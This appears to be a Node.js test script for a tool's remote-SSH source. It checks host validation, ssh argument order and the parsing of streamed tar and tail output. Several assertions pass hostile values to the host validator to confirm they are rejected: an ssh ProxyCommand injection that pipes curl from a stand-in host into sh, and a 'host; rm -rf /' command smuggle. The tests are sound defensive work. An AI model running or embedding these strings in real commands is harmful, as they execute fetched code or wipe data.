// Verifies the remote-SSH source: host validation, the two fetch framings,
// and that a remote source produces byte-identical sessions to a local one.
// Run: node scripts/remote-check.mjs
import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { readWindowStates, validHost } from "../src/window-state.mjs";

// --- validHost ------------------------------------------------------------
assert.equal(validHost("192.168.2.6"), "192.168.2.6", "a plain host passes");
assert.equal(validHost("pi@192.168.2.6"), "pi@192.168.2.6", "user@host passes");
assert.equal(validHost("beast.local"), "beast.local", "a dotted name passes");
// A leading dash is an ssh *option*, not a host: `-oProxyCommand=...` would
// run locally. execFile does not help — the parsing is ssh's own.
assert.equal(validHost("-oProxyCommand=curl evil|sh"), null, "a leading dash is rejected");
assert.equal(validHost("host; rm -rf /"), null, "shell metacharacters are rejected");
assert.equal(validHost("host name"), null, "a space is rejected");
assert.equal(validHost(""), null, "empty is rejected");
assert.equal(validHost(undefined), null, "absent is null, not a throw");
assert.equal(validHost(42), null, "a non-string is null, not a throw");

// --- readWindowStates carries host ---------------------------------------
const dir = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(
  join(dir, `${process.pid}.json`),
  JSON.stringify({ folders: ["/home/pi/x"], focused: false, activeSessionId: null, host: "192.168.2.6" })
);
const [win] = readWindowStates(dir);
assert.equal(win.host, "192.168.2.6", "a published host is returned");

const dir2 = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(
  join(dir2, `${process.pid}.json`),
  JSON.stringify({ folders: ["/x"], focused: false, activeSessionId: null, host: "-oProxyCommand=x" })
);
assert.equal(readWindowStates(dir2)[0].host, null, "a hostile host is dropped, the window is kept");

const dir3 = await mkdtemp(join(tmpdir(), "streamdeck-remote-check-"));
await writeFile(join(dir3, `${process.pid}.json`), JSON.stringify({ folders: ["/x"], focused: true }));
assert.equal(readWindowStates(dir3)[0].host, null, "a window with no host reads null, not undefined");

// --- call 1 framing -------------------------------------------------------
import { sshArgs, splitTreeStream } from "../src/remote-fs.mjs";

const treeStream = Buffer.concat([
  Buffer.from("2187779\n1\n412\n---\n"),
  Buffer.from("TAR-BYTES-\x00\x01\x02"),
]);
const split = splitTreeStream(treeStream);
assert.deepEqual([...split.pids].sort((a, b) => a - b), [1, 412, 2187779], "pids parse");
assert.equal(split.tar.toString("binary"), "TAR-BYTES-\x00\x01\x02", "tar bytes survive the split byte-exact");

// A separator inside the tar payload must not re-split: only the first wins.
const twice = splitTreeStream(Buffer.from("7\n---\nA\n---\nB"));
assert.equal(twice.tar.toString(), "A\n---\nB", "only the first separator splits the stream");

// A host that answered nothing is empty, never a throw.
assert.deepEqual([...splitTreeStream(Buffer.alloc(0)).pids], [], "an empty stream has no pids");
assert.equal(splitTreeStream(Buffer.alloc(0)).tar.length, 0, "an empty stream has no tar");

// --- ssh argv -------------------------------------------------------------
const argv = sshArgs("192.168.2.6", "/tmp/cm/%r@%h:%p");
assert.equal(argv.at(-1), "192.168.2.6", "the host is the last argument");
assert.equal(argv.at(-2), "--", "the host is passed after --, so a dash cannot become an option");
assert.ok(argv.includes("BatchMode=yes"), "never prompts for a password");
assert.ok(argv.includes("ConnectTimeout=5"), "a dead host fails fast");

// --- call 2 framing -------------------------------------------------------
import { parseTails } from "../src/remote-fs.mjs";

const NUL = Buffer.from([0]);

// A short file: fewer than TAIL_BYTES came back, so tail had nothing more to
// give and absence in the lines is absence in the file.
const short = Buffer.concat([Buffer.from("a\nb\n"), NUL]);
assert.deepEqual(parseTails(short, ["/p/a.jsonl"]), new Map([["/p/a.jsonl", { lines: ["a", "b", ""], whole: true }]]), "a short file is whole");

// A full tail window: whole must be false — this is the case that makes
// startedEmpty lie, and a wrong `true` here puts CLEAR on a busy session.
const body = "x".repeat(65536);
const long = Buffer.concat([Buffer.from(body), NUL]);
assert.equal(parseTails(long, ["/p/b.jsonl"]).get("/p/b.jsonl").whole, false, "a full tail window is not whole");

// Exactly TAIL_BYTES is reported not-whole. A file of exactly that size is
// indistinguishable from a larger one truncated to it, and this is the safe
// direction: it withholds startedEmpty rather than asserting it.
assert.equal(parseTails(Buffer.concat([Buffer.from("x".repeat(65535)), NUL]), ["/p/c.jsonl"]).get("/p/c.jsonl").whole, true, "one byte under the window is whole");

// Several files in one stream, in the order they were asked for.
const many = Buffer.concat([Buffer.from("A\n"), NUL, Buffer.from("B\n"), NUL]);
const manyOut = parseTails(many, ["/p/x.jsonl", "/p/y.jsonl"]);
assert.deepEqual(manyOut.get("/p/x.jsonl").lines, ["A", ""], "the first field ends at its terminator");
assert.deepEqual(manyOut.get("/p/y.jsonl").lines, ["B", ""], "the second field starts after it");

// The framing must not desync when a file yields more bytes than anything
// predicted — the live-append race a length prefix could not survive.
const grew = Buffer.concat([Buffer.from("A\nA\nA\n"), NUL, Buffer.from("B\n"), NUL]);
const grewOut = parseTails(grew, ["/p/x.jsonl", "/p/y.jsonl"]);
assert.deepEqual(grewOut.get("/p/x.jsonl").lines, ["A", "A", "A", ""], "a field longer than expected stays its own field");
assert.deepEqual(grewOut.get("/p/y.jsonl").lines, ["B", ""], "and the next file is still read from the right offset");

// A missing file is an empty field: unknown, and it consumes exactly its terminator.
const missing = parseTails(Buffer.concat([NUL, Buffer.from("B\n"), NUL]), ["/p/gone.jsonl", "/p/y.jsonl"]);
assert.deepEqual(missing.get("/p/gone.jsonl"), { lines: [], whole: false }, "a missing file is unknown, not empty");
assert.deepEqual(missing.get("/p/y.jsonl").lines, ["B", ""], "and the next file still parses");

// A stream that stopped before its terminator yields unknown.
assert.deepEqual(parseTails(Buffer.from("ab"), ["/p/cut.jsonl"]), new Map([["/p/cut.jsonl", { lines: [], whole: false }]]), "an unterminated field is unknown");

// More paths than fields: the surplus is unknown rather than undefined.
const fewer = parseTails(Buffer.concat([Buffer.from("A\n"), NUL]), ["/p/x.jsonl", "/p/missing.jsonl"]);
assert.deepEqual(fewer.get("/p/missing.jsonl"), { lines: [], whole: false }, "a path with no field at all is unknown");

console.log("remote-check: OK");
